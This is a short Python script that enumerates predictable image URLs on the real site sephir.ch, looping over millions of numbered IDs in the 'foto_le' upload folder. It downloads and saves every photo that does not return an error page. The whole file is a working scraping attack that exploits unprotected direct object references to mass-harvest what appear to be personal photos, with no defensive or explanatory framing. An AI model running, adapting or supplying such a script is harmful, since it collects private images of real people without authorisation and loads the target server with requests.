import requests

url = "https://sephir.ch/ict/upload/foto_le/foto-"


for x in range(0,10000):
    for y in range(1000,10000):
        y_f = '{:04d}'.format(y)
        img_data = requests.get(f'https://sephir.ch/ict/upload/foto_le/foto-{x}_{y_f}.jpg')
        if not "div" in str(img_data.content):
            print(f"{x}_{y_f}: Succsess!")
            with open(f'image_{x}_{y_f}.jpg', 'wb') as handler:
                handler.write(img_data.content)
        if y % 100 == 0:
            print(f"{x}_{y_f}")
